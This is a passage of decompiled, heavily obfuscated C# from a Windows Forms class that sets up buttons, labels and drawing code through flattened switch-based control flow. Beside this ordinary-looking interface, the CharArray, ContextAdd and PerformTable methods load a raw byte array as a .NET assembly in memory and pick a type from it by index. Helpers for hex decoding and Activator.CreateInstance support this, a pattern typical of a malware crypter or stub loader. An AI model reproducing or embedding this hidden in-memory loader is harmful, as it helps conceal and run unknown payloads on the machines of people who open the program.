					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -673222221) ^ 0x140C87E6;
					continue;
				case 41u:
					button1 = Form1.smethod_53();
					num = (int)((num2 * 828683211) ^ 0x2F0D4F75);
					continue;
				case 40u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 146606854) ^ 0x13531134);
					continue;
				case 39u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -877441788) ^ 0x7E645641;
					continue;
				case 38u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -254820117) ^ 0x32F65369;
					continue;
				case 37u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 356600873) ^ 0x541AC74E);
					continue;
				case 36u:
					num = (int)((num2 * 1858324515) ^ 0x175EA5BF);
					continue;
				case 35u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1768831291) ^ 0x7FB6901F;
					continue;
				case 34u:
					num = ((int)num2 * -1599143709) ^ 0x741BB98D;
					continue;
				case 33u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)(num2 * 642701922) ^ -1452713177;
					continue;
				case 32u:
					num = (int)(num2 * 123048468) ^ -2036743972;
					continue;
				case 31u:
					num = ((int)num2 * -635578753) ^ -1006503598;
					continue;
				case 30u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 1241551574) ^ -1740796374;
					continue;
				case 29u:
					num = (int)(num2 * 430028910) ^ -185640506;
					continue;
				case 28u:
					num = (int)((num2 * 561129279) ^ 0x75A1BA35);
					continue;
				case 27u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 449800810) ^ 0x7DBE2639);
					continue;
				case 26u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 359878794) ^ -200544746;
					continue;
				case 25u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 1827503079) ^ -1634426531;
					continue;
				case 24u:
					num = ((int)num2 * -1954597863) ^ -337454373;
					continue;
				case 23u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1183355167) ^ 0x26B9A9EC;
					continue;
				case 22u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 90799860) ^ 0x760777A4);
					continue;
				case 21u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 974674030) ^ -90962726;
					continue;
				case 20u:
					num = ((int)num2 * -2008185154) ^ 0x36F3A169;
					continue;
				case 19u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 1387912098) ^ 0x3745E744);
					continue;
				case 18u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -6865355) ^ 0x11DFD7E;
					continue;
				case 17u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1117253734) ^ -1576067059;
					continue;
				case 16u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1974724365) ^ -545733353;
					continue;
				case 15u:
					num = ((int)num2 * -1446338234) ^ -146060940;
					continue;
				case 14u:
					num = (int)((num2 * 2147101712) ^ 0x68343DD0);
					continue;
				case 13u:
					components = Form1.smethod_52();
					num = ((int)num2 * -173408740) ^ 0x3B462042;
					continue;
				case 12u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 1264212349) ^ -1254156008;
					continue;
				case 11u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1718136888) ^ 0x3F972F4);
					continue;
				case 10u:
					num = (int)((num2 * 1567808562) ^ 0x70C358C9);
					continue;
				case 9u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 1168643459) ^ -1942051834;
					continue;
				case 8u:
					num = (int)(num2 * 925233027) ^ -246534200;
					continue;
				case 7u:
					label2 = Form1.smethod_57();
					num = ((int)num2 * -239265662) ^ 0x92E9C05;
					continue;
				case 6u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)(num2 * 2085778215) ^ -1682622491;
					continue;
				case 5u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 22675453) ^ 0x670BCAC5);
					continue;
				case 4u:
					num = ((int)num2 * -1342376861) ^ -2096136103;
					continue;
				case 3u:
					num = (int)(num2 * 2052781408) ^ -233195390;
					continue;
				case 2u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)((num2 * 783623284) ^ 0x1CF6939F);
					continue;
				case 1u:
					num = (int)(num2 * 91450976) ^ -1795735080;
					continue;
				case 0u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -514601626) ^ -1346052185;
					continue;
				default:
					return;
				case 68u:
					break;
				case 116u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 238317956;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x19F2198Du) % 4u)
				{
				case 3u:
					num = (int)(num2 * 1898082904) ^ -838023947;
					continue;
				case 1u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -754879937) ^ 0x68BC8BA1;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -903870813;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x84EA41D3u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = ((int)num2 * -1869021001) ^ -686067510;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
